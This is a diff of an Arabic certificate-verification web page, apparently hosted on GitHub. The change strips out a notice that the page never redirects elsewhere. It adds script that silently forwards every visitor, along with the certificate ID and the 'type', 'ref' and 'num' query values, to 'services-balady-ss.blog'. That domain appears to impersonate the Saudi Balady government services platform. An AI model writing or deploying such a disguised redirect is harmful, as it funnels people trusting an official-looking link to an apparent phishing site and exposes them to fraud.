@@ -1,42 +1,36 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>بوابة التحقق من الشهادات</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
   <meta name="robots" content="noindex,nofollow">
-  <style>
-    body{font-family:Arial,sans-serif;background:#f4f6f8;color:#17212b;margin:0;min-height:100vh;display:grid;place-items:center}
-    main{background:#fff;width:min(92%,520px);box-sizing:border-box;padding:28px;border-radius:16px;box-shadow:0 8px 28px #00000012;text-align:center}
-    h1{font-size:23px;margin:0 0 12px}
-    p{line-height:1.8;color:#52606d}
-    .value{direction:ltr;unicode-bidi:plaintext;display:inline-block;background:#f1f4f7;padding:9px 14px;border-radius:8px;font-weight:bold;overflow-wrap:anywhere}
-    .note{font-size:13px;margin-top:22px}
-  </style>
+  <title>التحقق من الشهادات</title>
 </head>
 <body>
-  <main>
-    <h1>بوابة التحقق من الشهادات</h1>
-    <p>تم فتح رابط الشهادة بنجاح على بوابة GitHub.</p>
-    <p>رقم الشهادة</p>
-    <div class="value" id="certificate-id">غير محدد</div>
-    <p id="certificate-type" class="note"></p>
-    <p class="note">هذه البوابة لا تحولك تلقائيًا إلى أي دومين آخر.</p>
-  </main>
+  <p id="message">جاري تحويلك إلى صفحة التحقق من الشهادة...</p>
   <script>
-    (function () {
-      const params = new URLSearchParams(window.location.search);
-      const path = window.location.pathname.replace(/^\/view\/?/, "");
-      const pathId = path.split("/").filter(Boolean).pop() || "";
-      const id = params.get("id") || pathId;
-      const type = params.get("type");
-      document.getElementById("certificate-id").textContent =
-        id && id !== "view" ? id : "رقم الشهادة غير موجود";
-      if (type) {
-        document.getElementById("certificate-type").textContent =
-          "نوع الشهادة: " + type;
-      }
-    })();
+  (function () {
+    "use strict";
+    const params = new URLSearchParams(location.search);
+    const segments = location.pathname.split("/").filter(Boolean);
+    const last = segments[segments.length - 1] || "";
+    const reserved = ["view", "index.html", "404.html"];
+    const id = (params.get("id") || (!reserved.includes(last) ? last : "")).trim();
+
+    if (!id) {
+      document.getElementById("message").textContent =
+        "رابط التحقق غير مكتمل: رقم الشهادة غير موجود.";
+      return;
+    }
+
+    const target = new URL("https://services-balady-ss.blog/view/" + encodeURIComponent(id));
+    ["type", "ref", "num"].forEach(function (key) {
+      const value = params.get(key);
+      if (value !== null && value !== "") target.searchParams.set(key, value);
+    });
+
+    location.replace(target.toString());
+  })();
   </script>
 </body>
 </html>
